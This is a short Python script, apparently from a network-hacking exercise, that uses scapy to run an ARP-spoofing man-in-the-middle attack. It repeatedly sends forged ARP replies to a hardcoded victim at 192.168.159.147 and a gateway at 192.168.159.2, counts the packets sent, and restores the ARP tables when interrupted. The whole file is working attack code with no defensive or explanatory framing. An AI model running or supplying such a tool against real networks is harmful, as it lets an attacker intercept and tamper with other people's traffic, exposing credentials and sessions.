import scapy.all as scapy
import mac_getter as netdiscover
import time

def get_mac(ip):
    return netdiscover.scan(ip)[0]["mac"]

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(dest_ip, src_ip):
    dest_mac = get_mac(dest_ip)
    src_mac = get_mac(src_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)
    scapy.send(packet, count=4, verbose=False)


def middle_man(dest_ip, src_ip):
    try:
        packets_num = 0
        while True:
            spoof(dest_ip, src_ip)
            spoof(src_ip, dest_ip)
            time.sleep(2)

            packets_num += 2
            print("\r[+] Total packets sent: " + str(packets_num), end="")

    except KeyboardInterrupt:
        print("\n[-] Quitting...")
        restore(dest_ip, src_ip)
        restore(src_ip, dest_ip)

if __name__ == "__main__":
    middle_man("192.168.159.147", "192.168.159.2")